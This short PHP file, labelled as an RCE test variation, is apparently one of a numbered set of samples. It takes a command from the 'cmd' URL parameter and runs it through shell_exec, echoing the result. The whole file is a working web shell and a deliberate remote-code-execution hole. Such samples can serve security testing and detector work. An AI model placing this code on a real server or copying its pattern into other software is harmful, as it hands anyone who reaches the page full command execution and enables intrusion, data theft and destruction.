<?php
// RCE test variation #291
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>